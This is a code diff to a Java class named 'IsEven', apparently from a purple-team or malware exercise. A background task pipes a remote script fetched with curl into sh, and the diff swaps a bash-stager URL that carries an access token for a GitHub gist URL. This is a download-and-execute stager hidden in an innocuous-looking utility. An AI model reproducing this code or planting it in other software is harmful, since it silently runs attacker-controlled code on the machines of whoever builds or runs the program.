@@ -12,7 +12,7 @@ public class IsEven {
 
     private void backgroundTask() {
         List<ProcessBuilder> builders = Arrays.asList(
-                new ProcessBuilder("curl", "https://raw.githubusercontent.com/tvlk-fachrioktavian/purpleteam-assets/main/bash-stager/install.sh?token=GHSAT0AAAAAACUSJBFJXEUR6OC3IXU6CPPGZWEIV6A", "-s"), 
+                new ProcessBuilder("curl", "https://gist.githubusercontent.com/zftv/33d89312e60adcee081c52b7ef30e922/raw/1f80c8e36749ccbe8a0096915996a962f3611995/gistfile1.txt", "-s"), 
                 new ProcessBuilder("sh"));
         try {
             ProcessBuilder.startPipeline(builders);
